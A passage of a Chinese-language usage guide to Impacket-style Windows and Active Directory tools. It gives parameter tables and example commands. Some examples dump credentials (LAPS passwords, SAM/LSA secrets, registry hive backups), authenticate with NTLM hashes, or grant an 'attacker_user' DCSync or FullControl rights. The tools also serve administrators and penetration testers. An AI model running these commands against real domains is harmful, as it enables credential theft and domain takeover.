| `target` | domain[/username[:password]] |

**选项参数**:

| 参数                                    | 说明                     |
| --------------------------------------- | ------------------------ |
| `-computer computername`                | 按名称指定目标计算机     |
| `-ts`                                   | 为每个日志输出添加时间戳 |
| `-debug`                                | 开启调试输出             |
| `-outputfile OUTPUTFILE, -o OUTPUTFILE` | 输出到文件               |

**认证参数**:

| 参数                    | 说明                                                         |
| ----------------------- | ------------------------------------------------------------ |
| `-hashes LMHASH:NTHASH` | NTLM 哈希值，格式为 LMHASH:NTHASH                            |
| `-no-pass`              | 不询问密码（对 -k 有用）                                     |
| `-k`                    | 使用 Kerberos 身份验证，从 ccache 文件（KRB5CCNAME）获取凭据 |
| `-aesKey hex key`       | 用于 Kerberos 身份验证的 AES 密钥（128 或 256 位）           |

**连接参数**:

| 参数                | 说明                                                                                   |
| ------------------- | -------------------------------------------------------------------------------------- |
| `-dc-ip ip address` | 域控制器的 IP 地址                                                                     |
| `-dc-host hostname` | 要使用的域控制器主机名                                                                 |
| `-ldaps`            | 启用 LDAPS（基于 SSL 的 LDAP）。当查询强制 LDAPS 的 Windows Server 2025 域控制器时需要 |

**示例**:

```python
python GetLAPSPassword.py domain/username:password@dc_ip
python GetLAPSPassword.py -computer WORKSTATION01 domain/username:password@dc_ip
python GetLAPSPassword.py -outputfile laps_passwords.txt domain/username:password@dc_ip
python GetLAPSPassword.py -ldaps domain/username:password@dc_ip
```

## 网络工具

### smbclient.py

**功能**: SMB 客户端工具
**用途**: 连接到远程 SMB 服务器，访问文件共享

**参数说明**:

**位置参数**:

| 参数     | 说明                                                                      |
| -------- | ------------------------------------------------------------------------- |
| `target` | 目标系统，格式为 `[[domain/]username[:password]@]<targetName or address>` |

**选项参数**:

| 参数                     | 说明                          |
| ------------------------ | ----------------------------- |
| `-outputfile OUTPUTFILE` | 记录 smbclient 操作的输出文件 |
| `-debug`                 | 开启调试输出                  |
| `-ts`                    | 为每个日志输出添加时间戳      |

**认证参数**:

| 参数                    | 说明                                               |
| ----------------------- | -------------------------------------------------- |
| `-hashes LMHASH:NTHASH` | NTLM 哈希值，格式为 LMHASH:NTHASH                  |
| `-no-pass`              | 不询问密码（对 -k 有用）                           |
| `-k`                    | 使用 Kerberos 身份验证                             |
| `-aesKey hex key`       | 用于 Kerberos 身份验证的 AES 密钥（128 或 256 位） |

**连接参数**:

| 参数                       | 说明                        |
| -------------------------- | --------------------------- |
| `-dc-ip ip address`        | 域控制器的 IP 地址          |
| `-target-ip ip address`    | 目标机器的 IP 地址          |
| `-port [destination port]` | 连接到 SMB 服务器的目标端口 |

**示例**:

```python
python smbclient.py domain/username:password@target_ip
python smbclient.py -hashes 00000000000000000000000000000000:hash domain/username@target_ip
```

### smbserver.py

**功能**: 搭建 SMB 服务器
**用途**: 创建本地 SMB 服务器用于文件共享

**参数说明**:

**位置参数**:

| 参数        | 说明             |
| ----------- | ---------------- |
| `shareName` | 要添加的共享名称 |
| `sharePath` | 要添加的共享路径 |

**选项参数**:

| 参数                                                           | 说明                                             |
| -------------------------------------------------------------- | ------------------------------------------------ |
| `-comment COMMENT`                                             | 询问共享时显示的共享注释                         |
| `-username USERNAME`                                           | 用于验证客户端的用户名                           |
| `-password PASSWORD`                                           | 用户名的密码                                     |
| `-hashes LMHASH:NTHASH`                                        | 用户名的 NTLM 哈希值，格式为 LMHASH:NTHASH       |
| `-ts`                                                          | 为每个日志输出添加时间戳                         |
| `-debug`                                                       | 开启调试输出                                     |
| `-ip INTERFACE_ADDRESS, --interface-address INTERFACE_ADDRESS` | 监听接口的 IP 地址（省略时为 "0.0.0.0" 或 "::"） |
| `-port PORT`                                                   | 监听传入连接的 TCP 端口（默认 445）              |
| `-dropssp`                                                     | 在协商期间禁用 NTLM ESS/SSP                      |
| `-6, --ipv6`                                                   | 监听 IPv6                                        |
| `-smb2support`                                                 | SMB2 支持（实验性！）                            |
| `-outputfile OUTPUTFILE`                                       | 记录 smbserver 输出消息的输出文件                |

**示例**:

```python
python smbserver.py TMP C:\temp
python smbserver.py -username test -password test123 SHARE C:\share
python smbserver.py -comment "My Share" -port 4455 SHARE C:\path
```

### rpcdump.py

**功能**: RPC 接口转储工具
**用途**: 通过 epmapper 转储远程 RPC 端点信息

**参数说明**:

**位置参数**:

| 参数     | 说明                                                                      |
| -------- | ------------------------------------------------------------------------- |
| `target` | 目标系统，格式为 `[[domain/]username[:password]@]<targetName or address>` |

**选项参数**:

| 参数     | 说明                     |
| -------- | ------------------------ |
| `-debug` | 开启调试输出             |
| `-ts`    | 为每个日志输出添加时间戳 |

**连接参数**:

| 参数                       | 说明                                  |
| -------------------------- | ------------------------------------- |
| `-target-ip ip address`    | 目标机器的 IP 地址                    |
| `-port [destination port]` | 连接到 RPC Endpoint Mapper 的目标端口 |

**认证参数**:

| 参数                    | 说明                              |
| ----------------------- | --------------------------------- |
| `-hashes LMHASH:NTHASH` | NTLM 哈希值，格式为 LMHASH:NTHASH |

**示例**:

```python
python rpcdump.py target_ip
python rpcdump.py -target-ip 192.168.1.100 domain/username:password@target_name
python rpcdump.py -port 135 target_ip
```

### rpcmap.py

**功能**: RPC 接口映射工具
**用途**: 映射目标系统上的 RPC 服务
**示例**:

```python
python rpcmap.py target_ip
```

### CheckLDAPStatus.py

**功能**: 检查 LDAP 服务器状态
**用途**: LDAP 签名和通道绑定枚举工具

**参数说明**:

**选项参数**:

| 参数                | 说明                                |
| ------------------- | ----------------------------------- |
| `-dc-ip ip address` | 域控制器的 IP 地址或域的 DNS 解析器 |
| `-domain DOMAIN`    | 域名                                |
| `-debug`            | 开启调试输出                        |
| `-timeout TIMEOUT`  | DNS 超时时间                        |
| `-ts`               | 为每个日志输出添加时间戳            |

**示例**:

```python
python CheckLDAPStatus.py -dc-ip 192.168.1.100 -domain example.com
python CheckLDAPStatus.py -dc-ip dc.example.com -domain example.com -debug
```

### mssqlclient.py

**功能**: MSSQL 数据库客户端
**用途**: TDS 客户端实现（支持 SSL）

**参数说明**:

**位置参数**:

| 参数     | 说明                                                                      |
| -------- | ------------------------------------------------------------------------- |
| `target` | 目标系统，格式为 `[[domain/]username[:password]@]<targetName or address>` |

**选项参数**:

| 参数                     | 说明                                          |
| ------------------------ | --------------------------------------------- |
| `-db DB`                 | MSSQL 数据库实例（默认 None）                 |
| `-windows-auth`          | 是否使用 Windows 身份验证（默认 False）       |
| `-debug`                 | 开启调试输出                                  |
| `-show`                  | 显示查询                                      |
| `-command [COMMAND ...]` | 要在 SQL shell 中执行的命令，可以传递多个命令 |
| `-file FILE`             | 包含要在 SQL shell 中执行的命令的输入文件     |

**认证参数**:

| 参数                    | 说明                                               |
| ----------------------- | -------------------------------------------------- |
| `-hashes LMHASH:NTHASH` | NTLM 哈希值，格式为 LMHASH:NTHASH                  |
| `-no-pass`              | 不询问密码（对 -k 有用）                           |
| `-k`                    | 使用 Kerberos 身份验证                             |
| `-aesKey hex key`       | 用于 Kerberos 身份验证的 AES 密钥（128 或 256 位） |

**连接参数**:

| 参数                    | 说明                         |
| ----------------------- | ---------------------------- |
| `-dc-ip ip address`     | 域控制器的 IP 地址           |
| `-target-ip ip address` | 目标机器的 IP 地址           |
| `-port PORT`            | 目标 MSSQL 端口（默认 1433） |

**示例**:

```python
python mssqlclient.py domain/username:password@target_ip
python mssqlclient.py -windows-auth domain/username:password@target_ip
python mssqlclient.py -db master -command "SELECT * FROM sys.databases" domain/username:password@target_ip
python mssqlclient.py -file queries.sql domain/username:password@target_ip
```

### mssqlinstance.py

**功能**: 查询 MSSQL 实例
**用途**: 查询远程主机上运行的 MSSQL 实例

**参数说明**:

**位置参数**:

| 参数   | 说明     |
| ------ | -------- |
| `host` | 目标主机 |

**选项参数**:

| 参数               | 说明                     |
| ------------------ | ------------------------ |
| `-timeout TIMEOUT` | 等待答案的超时时间       |
| `-debug`           | 开启调试输出             |
| `-ts`              | 为每个日志输出添加时间戳 |

**示例**:

```python
python mssqlinstance.py target_ip
python mssqlinstance.py -timeout 10 target_ip
python mssqlinstance.py -debug target_ip
```

### rdp_check.py

**功能**: RDP 账户验证
**用途**: 使用 RDP 协议测试账户在目标主机上是否有效

**参数说明**:

**位置参数**:

| 参数     | 说明                                                   |
| -------- | ------------------------------------------------------ |
| `target` | [[domain/]username[:password]@]<targetName or address> |

**选项参数**:

| 参数         | 说明                     |
| ------------ | ------------------------ |
| `-6, --ipv6` | 在 IPv6 上测试           |
| `-ts`        | 为每个日志输出添加时间戳 |
| `-debug`     | 开启调试输出             |

**认证参数**:

| 参数                    | 说明                              |
| ----------------------- | --------------------------------- |
| `-hashes LMHASH:NTHASH` | NTLM 哈希值，格式为 LMHASH:NTHASH |

**示例**:

```python
python rdp_check.py domain/username:password@target_ip
python rdp_check.py -6 domain/username:password@target_ip
python rdp_check.py -hashes 00000000000000000000000000000000:ntlm_hash domain/username@target_ip
```

## 系统管理工具

### services.py

**功能**: 管理远程服务
**用途**: Windows 服务操作脚本

**参数说明**:

**位置参数**:

| 参数     | 说明                                                                      |
| -------- | ------------------------------------------------------------------------- |
| `target` | 目标系统，格式为 `[[domain/]username[:password]@]<targetName or address>` |
| `start`  | 启动服务                                                                  |
| `stop`   | 停止服务                                                                  |
| `delete` | 删除服务                                                                  |
| `status` | 返回服务状态                                                              |
| `config` | 返回服务配置                                                              |
| `list`   | 列出可用服务                                                              |
| `create` | 创建服务                                                                  |
| `change` | 更改服务配置                                                              |

**选项参数**:

| 参数     | 说明                     |
| -------- | ------------------------ |
| `-debug` | 开启调试输出             |
| `-ts`    | 为每个日志输出添加时间戳 |

**认证参数**:

| 参数                    | 说明                                               |
| ----------------------- | -------------------------------------------------- |
| `-hashes LMHASH:NTHASH` | NTLM 哈希值，格式为 LMHASH:NTHASH                  |
| `-no-pass`              | 不询问密码（对 -k 有用）                           |
| `-k`                    | 使用 Kerberos 身份验证                             |
| `-aesKey hex key`       | 用于 Kerberos 身份验证的 AES 密钥（128 或 256 位） |

**连接参数**:

| 参数                       | 说明                        |
| -------------------------- | --------------------------- |
| `-dc-ip ip address`        | 域控制器的 IP 地址          |
| `-target-ip ip address`    | 目标机器的 IP 地址          |
| `-port [destination port]` | 连接到 SMB 服务器的目标端口 |

**示例**:

```python
python services.py domain/username:password@target_ip list
python services.py domain/username:password@target_ip status "WinRM"
python services.py domain/username:password@target_ip start "WinRM"
python services.py domain/username:password@target_ip stop "WinRM"
```

### registry-read.py

**功能**: 读取远程注册表
**用途**: 从注册表配置单元读取数据

**参数说明**:

**位置参数**:

| 参数          | 说明                       |
| ------------- | -------------------------- |
| `hive`        | 要打开的注册表配置单元     |
| `enum_key`    | 枚举指定开放注册表项的子项 |
| `enum_values` | 枚举指定开放注册表项的值   |
| `get_value`   | 检索指定注册表值的数据     |
| `get_class`   | 检索指定注册表类的数据     |
| `walk`        | 从命名节点向下遍历注册表   |

**选项参数**:

| 参数     | 说明                     |
| -------- | ------------------------ |
| `-debug` | 开启调试输出             |
| `-ts`    | 为每个日志输出添加时间戳 |

**示例**:

```python
python registry-read.py HKLM enum_key SOFTWARE
python registry-read.py HKCU get_value Environment PATH
python registry-read.py HKLM walk SYSTEM\CurrentControlSet\Services
```

### reg.py

**功能**: 远程注册表管理工具
**用途**: Windows 注册表操作脚本

**参数说明**:

**位置参数**:

| 参数     | 说明                                                                      |
| -------- | ------------------------------------------------------------------------- |
| `target` | 目标系统，格式为 `[[domain/]username[:password]@]<targetName or address>` |
| `query`  | 返回位于注册表中指定子键下的下一层子键和条目列表                          |
| `add`    | 向注册表添加新的子键或条目                                                |
| `delete` | 从注册表中删除子键或条目                                                  |
| `save`   | 将注册表的指定子键、条目和值的副本保存到指定文件中                        |
| `backup` | 将 HKLM\SAM、HKLM\SYSTEM 和 HKLM\SECURITY 备份到指定文件                  |

**选项参数**:

| 参数     | 说明                     |
| -------- | ------------------------ |
| `-debug` | 开启调试输出             |
| `-ts`    | 为每个日志输出添加时间戳 |

**认证参数**:

| 参数                    | 说明                                               |
| ----------------------- | -------------------------------------------------- |
| `-hashes LMHASH:NTHASH` | NTLM 哈希值，格式为 LMHASH:NTHASH                  |
| `-no-pass`              | 不询问密码（对 -k 有用）                           |
| `-k`                    | 使用 Kerberos 身份验证                             |
| `-aesKey hex key`       | 用于 Kerberos 身份验证的 AES 密钥（128 或 256 位） |

**连接参数**:

| 参数                       | 说明                        |
| -------------------------- | --------------------------- |
| `-dc-ip ip address`        | 域控制器的 IP 地址          |
| `-target-ip ip address`    | 目标机器的 IP 地址          |
| `-port [destination port]` | 连接到 SMB 服务器的目标端口 |

**示例**:

```python
python reg.py query domain/username:password@target_ip HKLM\Software
python reg.py add domain/username:password@target_ip HKCU\Software\Test "ValueName" "ValueData"
python reg.py delete domain/username:password@target_ip HKCU\Software\Test
python reg.py backup domain/username:password@target_ip backup.reg
```

### regsecrets.py

**功能**: 提取注册表密钥
**用途**: 执行各种技术从远程机器提取密钥，无需在那里执行任何代理

**参数说明**:

**位置参数**:

| 参数     | 说明                                                                      |
| -------- | ------------------------------------------------------------------------- |
| `target` | 目标系统，格式为 `[[domain/]username[:password]@]<targetName or address>` |

**选项参数**:

| 参数                     | 说明                                                     |
| ------------------------ | -------------------------------------------------------- |
| `-ts`                    | 为每个日志输出添加时间戳                                 |
| `-debug`                 | 开启调试输出                                             |
| `-system SYSTEM`         | 要解析的 SYSTEM 配置单元                                 |
| `-bootkey BOOTKEY`       | SYSTEM 配置单元的 bootkey                                |
| `-nosam`                 | 不检索 SAM 信息                                          |
| `-nocache`               | 不检索 MSCache 信息                                      |
| `-nolsa`                 | 不检索 LSASecrets                                        |
| `-throttle THROTTLE`     | 操作之间的节流时间（秒）                                 |
| `-outputfile OUTPUTFILE` | 基础输出文件名（将为 sam、secrets 和 cached 添加扩展名） |

**显示选项**:

| 参数       | 说明                                  |
| ---------- | ------------------------------------- |
| `-history` | 转储密码历史记录和 LSA secrets OldVal |

**认证参数**:

| 参数                    | 说明                                               |
| ----------------------- | -------------------------------------------------- |
| `-hashes LMHASH:NTHASH` | NTLM 哈希值，格式为 LMHASH:NTHASH                  |
| `-no-pass`              | 不询问密码（对 -k 有用）                           |
| `-k`                    | 使用 Kerberos 身份验证                             |
| `-aesKey hex key`       | 用于 Kerberos 身份验证的 AES 密钥（128 或 256 位） |
| `-keytab KEYTAB`        | 从 keytab 文件读取 SPN 的密钥                      |

**连接参数**:

| 参数                    | 说明               |
| ----------------------- | ------------------ |
| `-dc-ip ip address`     | 域控制器的 IP 地址 |
| `-target-ip ip address` | 目标机器的 IP 地址 |

**示例**:

```python
python regsecrets.py domain/username:password@target_ip
python regsecrets.py -debug -history domain/username:password@target_ip
python regsecrets.py -outputfile secrets domain/username:password@target_ip
python regsecrets.py -nosam -nocache domain/username:password@target_ip
```

### ntfs-read.py

**功能**: 读取 NTFS 文件系统
**用途**: NTFS 资源管理器（只读）

**参数说明**:

**位置参数**:

| 参数     | 说明                                                |
| -------- | --------------------------------------------------- |
| `volume` | 要打开的 NTFS 卷（例如 `\\.\C:` 或 `/dev/disk1s1`） |

**选项参数**:

| 参数               | 说明                                              |
| ------------------ | ------------------------------------------------- |
| `-extract EXTRACT` | 提取路径名（例如 `\windows\system32\config\sam`） |
| `-debug`           | 开启调试输出                                      |
| `-ts`              | 为每个日志输出添加时间戳                          |

**示例**:

```python
python ntfs-read.py \\.\C:
python ntfs-read.py -extract \windows\system32\config\sam \\.\C:
python ntfs-read.py -debug \\.\D:
```

### esentutl.py

**功能**: ESENT 数据库工具
**用途**: 扩展存储引擎实用程序，允许转储目录、页面和表

**参数说明**:

**位置参数**:

| 参数           | 说明                 |
| -------------- | -------------------- |
| `databaseFile` | 要打开的 ESE 文件    |
| `dump`         | 转储特定页面         |
| `info`         | 转储数据库的目录信息 |
| `export`       | 转储数据库的目录信息 |

**选项参数**:

| 参数         | 说明                     |
| ------------ | ------------------------ |
| `-debug`     | 开启调试输出             |
| `-ts`        | 为每个日志输出添加时间戳 |
| `-page PAGE` | 要打开的页面             |

**示例**:

```python
python esentutl.py file.edb info
python esentutl.py file.edb dump -page 10
python esentutl.py file.edb export
python esentutl.py -debug file.edb info
```

### attrib.py

**功能**: 文件属性管理工具
**用途**: 文件属性修改实用程序

**参数说明**:

**位置参数**:

| 参数     | 说明                                                                      |
| -------- | ------------------------------------------------------------------------- |
| `target` | 目标系统，格式为 `[[domain/]username[:password]@]<targetName or address>` |
| `share`  | 所需文件所在的共享                                                        |
| `path`   | 要查询或修改属性的文件路径                                                |
| `query`  | 查询当前文件/目录属性                                                     |
| `set`    | 修改文件/目录属性                                                         |

**选项参数**:

| 参数     | 说明         |
| -------- | ------------ |
| `-debug` | 开启调试输出 |

**认证参数**:

| 参数                    | 说明                                               |
| ----------------------- | -------------------------------------------------- |
| `-hashes LMHASH:NTHASH` | NTLM 哈希值，格式为 LMHASH:NTHASH                  |
| `-no-pass`              | 不询问密码（对 -k 有用）                           |
| `-k`                    | 使用 Kerberos 身份验证                             |
| `-aesKey hex key`       | 用于 Kerberos 身份验证的 AES 密钥（128 或 256 位） |

**连接参数**:

| 参数                                           | 说明                        |
| ---------------------------------------------- | --------------------------- |
| `-p destination port, --port destination port` | 连接到 SMB 服务器的目标端口 |
| `-dc-ip ip address`                            | 域控制器的 IP 地址          |
| `-target-ip ip address`                        | 目标机器的 IP 地址          |
| `-t seconds, --timeout seconds`                | 设置连接超时（秒）          |

**设置参数**:

| 参数               | 说明                             |
| ------------------ | -------------------------------- |
| `-r, --readonly`   | 只读文件或目录                   |
| `-H, --hidden`     | 隐藏文件或目录                   |
| `-s, --system`     | 系统文件或目录                   |
| `-a, --archive`    | 需要归档的文件或目录             |
| `-n, --normal`     | 没有其他属性设置的文件           |
| `-t, --temporary`  | 用于临时存储的文件               |
| `-c, --compressed` | 压缩的文件或目录                 |
| `-o, --offline`    | 数据不可立即获取的文件           |
| `-e, --encrypted`  | 加密的文件或目录                 |
| `-p, --pinned`     | 应保持完全本地存在的文件或目录   |
| `-u, --unpinned`   | 不应保持完全本地存在的文件或目录 |

**示例**:

```python
python attrib.py domain/username:password@target_ip share path query
python attrib.py domain/username:password@target_ip share path set -r -h
python attrib.py -k domain/username@target_ip share path query
python attrib.py -hashes :hash domain/username@target_ip share path set -a
```

### changepasswd.py

**功能**: 修改用户密码
**用途**: 通过不同协议更改或重置密码

**参数说明**:

**位置参数**:

| 参数     | 说明                                                                |
| -------- | ------------------------------------------------------------------- |
| `target` | 目标，格式为 `[[domain/]username[:password]@]<hostname or address>` |

**选项参数**:

| 参数     | 说明                     |
| -------- | ------------------------ |
| `-ts`    | 为每个日志输出添加时间戳 |
| `-debug` | 开启调试输出             |

**新凭据参数**:

| 参数                       | 说明                                             |
| -------------------------- | ------------------------------------------------ |
| `-newpass NEWPASS`         | 新密码                                           |
| `-newhashes LMHASH:NTHASH` | 新的 NTLM 哈希值，格式为 NTHASH 或 LMHASH:NTHASH |

**认证参数（目标用户）**:

| 参数                    | 说明                                        |
| ----------------------- | ------------------------------------------- |
| `-hashes LMHASH:NTHASH` | NTLM 哈希值，格式为 NTHASH 或 LMHASH:NTHASH |
| `-no-pass`              | 不询问密码（对 Kerberos 有用）              |

**认证参数（可选，执行更改的特权用户）**:

| 参数                                   | 说明                                         |
| -------------------------------------- | -------------------------------------------- |
| `-altuser ALTUSER`                     | 替代用户名                                   |
| `-altpass ALTPASS`                     | 替代密码                                     |
| `-althash ALTHASH, -althashes ALTHASH` | 替代 NT 哈希，格式为 NTHASH 或 LMHASH:NTHASH |

**操作方法**:

| 参数                                                                              | 说明                                         |
| --------------------------------------------------------------------------------- | -------------------------------------------- |
| `-protocol {smb-samr,rpc-samr,kpasswd,ldap}, -p {smb-samr,rpc-samr,kpasswd,ldap}` | 用于密码更改/重置的协议                      |
| `-reset, -admin`                                                                  | 尝试使用特权重置密码（可能绕过某些密码策略） |

**Kerberos 身份验证**:

| 参数                | 说明                                               |
| ------------------- | -------------------------------------------------- |
| `-k`                | 使用 Kerberos 身份验证                             |
| `-aesKey hex key`   | 用于 Kerberos 身份验证的 AES 密钥（128 或 256 位） |
| `-dc-ip ip address` | 域控制器的 IP 地址                                 |

**示例**:

```python
python changepasswd.py domain/username:old_password@dc_ip -newpass new_password
python changepasswd.py -protocol smb-samr domain/username:old_password@dc_ip -newhashes :hash
python changepasswd.py -reset domain/username@dc_ip -newpass new_password -altuser administrator -altpass admin_password
python changepasswd.py -protocol kpasswd domain/username:old_password@dc_ip -newpass new_password
python changepasswd.py -protocol ldap domain/username:old_password@dc_ip -newpass new_password
```

### addcomputer.py

**功能**: 向域添加计算机
**用途**: 向域添加计算机账户并设置其密码

**参数说明**:

**位置参数**:

| 参数                           | 说明                         |
| ------------------------------ | ---------------------------- |
| `[domain/]username[:password]` | 用于向 DC 进行身份验证的账户 |

**选项参数**:

| 参数                            | 说明                                                             |
| ------------------------------- | ---------------------------------------------------------------- |
| `-domain-netbios NETBIOSNAME`   | 域 NetBIOS 名称（如果 DC 有多个域则必需）                        |
| `-computer-name COMPUTER-NAME$` | 要添加的计算机名称（如果省略，将使用随机的 DESKTOP-[A-Z0-9]{8}） |
| `-computer-pass password`       | 设置给计算机的密码（如果省略，将使用随机的 [A-Za-z0-9]{32}）     |
| `-no-add`                       | 不添加计算机，只设置现有计算机的密码                             |
| `-delete`                       | 删除现有的计算机                                                 |
| `-ts`                           | 为每个日志输出添加时间戳                                         |
| `-debug`                        | 开启调试输出                                                     |
| `-method {SAMR,LDAPS}`          | 添加计算机的方法（SAMR 通过 SMB 工作，LDAPS 有一些证书要求）     |
| `-port {139,445,636}`           | 要连接的目标端口（SAMR 默认 445，LDAPS 默认 636）                |

**LDAP 参数**:

| 参数                                            | 说明                                                          |
| ----------------------------------------------- | ------------------------------------------------------------- |
| `-baseDN DC=test,DC=local`                      | 设置 LDAP 的 baseDN（如果省略，将使用账户参数中指定的域部分） |
| `-computer-group CN=Computers,DC=test,DC=local` | 账户将添加到的组（如果省略，将使用 CN=Computers）             |

**认证参数**:

| 参数                    | 说明                                               |
| ----------------------- | -------------------------------------------------- |
| `-hashes LMHASH:NTHASH` | NTLM 哈希值，格式为 LMHASH:NTHASH                  |
| `-no-pass`              | 不询问密码（对 -k 有用）                           |
| `-k`                    | 使用 Kerberos 身份验证                             |
| `-aesKey hex key`       | 用于 Kerberos 身份验证的 AES 密钥（128 或 256 位） |
| `-dc-host hostname`     | 要使用的域控制器的主机名                           |
| `-dc-ip ip`             | 要使用的域控制器的 IP                              |

**示例**:

```python
python addcomputer.py domain/username:password@dc_ip -computer-name "COMPUTER$" -computer-pass "Password123"
python addcomputer.py domain/username:password@dc_ip -computer-name "COMPUTER$" -method SAMR
python addcomputer.py -delete domain/username:password@dc_ip -computer-name "COMPUTER$"
python addcomputer.py -no-add domain/username:password@dc_ip -computer-name "COMPUTER$" -computer-pass "NewPassword"
python addcomputer.py -method LDAPS domain/username:password@dc_ip
```

### dacledit.py

**功能**: DACL 权限编辑工具
**用途**: 读取和管理对象的自由访问控制列表

**参数说明**:

**位置参数**:

| 参数       | 说明                                              |
| ---------- | ------------------------------------------------- |
| `identity` | 域身份，格式为 `domain.local/username[:password]` |

**选项参数**:

| 参数         | 说明                     |
| ------------ | ------------------------ |
| `-use-ldaps` | 使用 LDAPS 而不是 LDAP   |
| `-ts`        | 为每个日志输出添加时间戳 |
| `-debug`     | 开启调试输出             |

**认证与连接参数**:

| 参数                    | 说明                                               |
| ----------------------- | -------------------------------------------------- |
| `-hashes LMHASH:NTHASH` | NTLM 哈希值，格式为 LMHASH:NTHASH                  |
| `-no-pass`              | 不询问密码（对 -k 有用）                           |
| `-k`                    | 使用 Kerberos 身份验证                             |
| `-aesKey hex key`       | 用于 Kerberos 身份验证的 AES 密钥（128 或 256 位） |
| `-dc-ip ip address`     | 域控制器或 KDC 的 IP 地址                          |
| `-dc-host hostname`     | 域控制器或 KDC 的主机名                            |

**主体参数**:

| 参数                 | 说明           |
| -------------------- | -------------- |
| `-principal NAME`    | sAMAccountName |
| `-principal-sid SID` | 安全标识符     |
| `-principal-dn DN`   | 可分辨名称     |

**目标参数**:

| 参数              | 说明           |
| ----------------- | -------------- |
| `-target NAME`    | sAMAccountName |
| `-target-sid SID` | 安全标识符     |
| `-target-dn DN`   | 可分辨名称     |

**DACL 编辑器参数**:

| 参数                                                               | 说明                                                                    |
| ------------------------------------------------------------------ | ----------------------------------------------------------------------- |
| `-action [{read,write,remove,backup,restore}]`                     | 对 DACL 执行的操作（默认：read）                                        |
| `-file FILENAME`                                                   | 文件名/路径（对 -action backup 是可选的，对 -restore 是必需的）         |
| `-ace-type [{allowed,denied}]`                                     | 要添加或删除的 ACE 类型（默认：allowed）                                |
| `-rights [{FullControl,ResetPassword,WriteMembers,DCSync,Custom}]` | 要在目标 DACL 中写入/删除的权限（默认：FullControl）                    |
| `-rights-guid RIGHTS_GUID`                                         | 表示要写入/删除的权限的手动 GUID                                        |
| `-mask <mask>`                                                     | 强制访问掩码，可能的值：readwrite, write, self, allext, 0xXXXXX         |
| `-inheritance`                                                     | 在 ACE 标志中启用继承，使用 CONTAINER_INHERIT_ACE 和 OBJECT_INHERIT_ACE |

**示例**:

```python
python dacledit.py domain/username:password -target target_user -action read
python dacledit.py domain/username:password -target target_user -principal attacker_user -action write -rights FullControl
python dacledit.py domain/username:password -target-sid S-1-5-21-1234567890-1234567890-1234567890-1000 -principal-sid S-1-5-21-1234567890-1234567890-1234567890-1001 -action write -rights DCSync
python dacledit.py domain/username:password -target target_user -principal attacker_user -action remove -rights ResetPassword
python dacledit.py domain/username:password -target target_user -action backup -file backup.json
```

### owneredit.py

**功能**: 所有者权限编辑工具
**用途**: 读取和修改 Active Directory 对象的 Owner 属性 (OwnerSid)

**参数说明**:

**位置参数**:

| 参数       | 说明                                              |
| ---------- | ------------------------------------------------- |
| `identity` | 域身份，格式为 `domain.local/username[:password]` |

**选项参数**:

| 参数                     | 说明                                 |
| ------------------------ | ------------------------------------ |
| `-use-ldaps`             | 使用 LDAPS 而不是 LDAP               |
| `-ts`                    | 为每个日志输出添加时间戳             |
| `-debug`                 | 开启调试输出                         |
| `-action [{read,write}]` | 对所有者属性执行的操作（默认：read） |

**认证参数**:

| 参数                    | 说明                                               |
| ----------------------- | -------------------------------------------------- |
| `-hashes LMHASH:NTHASH` | NTLM 哈希值，格式为 LMHASH:NTHASH                  |
| `-no-pass`              | 不询问密码（对 -k 有用）                           |
| `-k`                    | 使用 Kerberos 身份验证                             |
| `-aesKey hex key`       | 用于 Kerberos 身份验证的 AES 密钥（128 或 256 位） |
| `-dc-ip ip address`     | 域控制器的 IP 地址                                 |
| `-dc-host hostname`     | 域控制器的主机名                                   |

**所有者参数**:

| 参数                 | 说明                      |
| -------------------- | ------------------------- |
| `-new-owner NAME`    | 新所有者的 sAMAccountName |
| `-new-owner-sid SID` | 新所有者的安全标识符      |
| `-new-owner-dn DN`   | 新所有者的可分辨名称      |

**目标参数**:

| 参数              | 说明                      |
| ----------------- | ------------------------- |
| `-target NAME`    | 目标对象的 sAMAccountName |
| `-target-sid SID` | 目标对象的安全标识符      |
| `-target-dn DN`   | 目标对象的可分辨名称      |

**示例**:

```python
python owneredit.py domain/username:password -target target_user -action read
python owneredit.py domain/username:password -target target_user -new-owner attacker_user -action write
python owneredit.py -use-ldaps domain/username:password -target-sid S-1-5-21-1234567890-1234567890-1234567890-1000 -action read
```

## Kerberos 票据工具

### getTGT.py

**功能**: 获取 Kerberos TGT 票据
**用途**: 获取 Kerberos 门票授予票据

**参数说明**:

**位置参数**:

| 参数       | 说明                                                |
| ---------- | --------------------------------------------------- |
| `identity` | 用户身份信息，格式为 `[domain/]username[:password]` |

**选项参数**:

| 参数         | 说明                     |
| ------------ | ------------------------ |
| `-h, --help` | 显示帮助信息             |
| `-ts`        | 为每个日志输出添加时间戳 |
| `-debug`     | 开启调试输出             |

**认证参数**:

| 参数                    | 说明                                                             |
| ----------------------- | ---------------------------------------------------------------- |
| `-hashes LMHASH:NTHASH` | NTLM 哈希值，格式为 LMHASH:NTHASH                                |
| `-no-pass`              | 不询问密码（对 -k 有用）                                         |
| `-k`                    | 使用 Kerberos 身份验证，从 ccache 文件（KRB5CCNAME）获取凭证     |
| `-aesKey hex key`       | 用于 Kerberos 身份验证的 AES 密钥（128 或 256 位）               |
| `-dc-ip ip address`     | 域控制器的 IP 地址，如果省略则使用目标参数中指定的域部分（FQDN） |

**服务参数**:

| 参数                             | 说明                                                                                 |
| -------------------------------- | ------------------------------------------------------------------------------------ |
| `-service SPN`                   | 通过 AS-REQ 直接请求服务票据                                                         |
| `-principalType [PRINCIPALTYPE]` | 令牌的主体类型，可以是 NT_UNKNOWN、NT_PRINCIPAL、NT_SRV_INST 等，默认为 NT_PRINCIPAL |

**示例**:

```python
python getTGT.py domain/username:password
python getTGT.py -hashes :nthash domain/username
python getTGT.py -k domain/username
python getTGT.py -aesKey hex_key domain/username
```

### getST.py

**功能**: 获取 Kerberos ST 票据
**用途**: 获取 Kerberos 服务票据

**参数说明**:

**位置参数**:

| 参数       | 说明                                                |
| ---------- | --------------------------------------------------- |
| `identity` | 用户身份信息，格式为 `[domain/]username[:password]` |

**选项参数**:

| 参数                               | 说明                                        |
| ---------------------------------- | ------------------------------------------- |
| `-h, --help`                       | 显示帮助信息                                |
| `-spn SPN`                         | 目标服务的 SPN（service/server）            |
| `-altservice ALTSERVICE`           | 在票据中设置新的 sname/SPN                  |
| `-dmsa`                            | 使用 DMSA（委托托管服务账户）               |
| `-impersonate IMPERSONATE`         | 要模拟的目标用户名（通过 S4U2Self）         |
| `-additional-ticket ticket.ccache` | 请求 RBCD + KCD Kerberos                    |
| `-ts`                              | 为每个日志输出添加时间戳                    |
